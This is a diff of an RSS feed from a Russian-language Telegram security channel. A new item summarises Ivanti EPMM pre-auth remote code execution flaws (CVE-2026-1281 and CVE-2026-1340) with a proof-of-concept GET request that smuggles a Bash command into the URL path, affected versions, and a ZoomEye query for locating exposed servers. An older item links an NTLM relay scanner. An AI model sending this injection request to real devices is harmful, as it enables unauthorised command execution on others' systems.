@@ -1,5 +1,21 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3</link><description>Reborn…</description><language>ru</language><lastBuildDate>Fri, 30 Jan 2026 14:34:28 +0000</lastBuildDate><item><title>Новый сканер для обнаружения уязвимостей к NTLM релеям</title><link>https://t.me/P0x3k_1N73LL1G3NC3/253</link><description>Новый сканер для обнаружения уязвимостей к NTLM релеям
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3</link><description>Reborn…</description><language>ru</language><lastBuildDate>Fri, 30 Jan 2026 18:59:02 +0000</lastBuildDate><item><title>Someone Knows Bash Far Too Well, And We Love It (Ivanti EPMM Pre-Auth RCEs CVE-2026-1281 &amp; CVE-2026-1340)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/254</link><description>Someone Knows Bash Far Too Well, And We Love It (Ivanti EPMM Pre-Auth RCEs CVE-2026-1281 &amp; CVE-2026-1340)
+Code injection issues, allowing a remote unauthenticated attacker to execute arbitrary code on an affected device. The attackers can provide Bash commands as part of a malicious HTTP GET request to the endpoints that service either the “In-House Application Distribution” feature (i.e. /mifs/c/appstore/fob/) or the “Android File Transfer Configuration” feature (i.e. /mifs/c/aftstore/fob/), resulting in arbitrary OS command execution on the target.
+PoC Request:
+GET /mifs/c/appstore/fob/3/5/sha256:kid=1,st=theValue%20%20,
+et=1337133713,h=gPath%5B%60id%20&gt;%20/mi/poc%60%5D/
+13371337-1337-1337-1337-133713371337.ipa HTTP/1.1
+Host: f5-research-lab-ioc-block-it-all.f5
+Affected versions:
+• 12.7.0.0 and prior
+• 12.6.0.0 and prior
+• 12.5.0.0 and prior
+• 12.6.1.0 and prior
+• 12.5.1.0 and prior
+Query:
+ZoomEye: app="Ivanti Endpoint Manager Mobile"
+
+[Media: Фото]</description><pubDate>Fri, 30 Jan 2026 18:59:02 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_254</guid></item><item><title>Новый сканер для обнаружения уязвимостей к NTLM релеям</title><link>https://t.me/P0x3k_1N73LL1G3NC3/253</link><description>Новый сканер для обнаружения уязвимостей к NTLM релеям
 https://github.com/depthsecurity/RelayKing-Depth/
 * Сканирует по SMB, LDAP/S, MSSQL, HTTP/S, RPC, WinRM
 * Находит WebDAV WebClient, CVE-2025-33073 (NTLM reflection), NTLMv1 + всякие PrinterBug, PetitPotam и т.п.
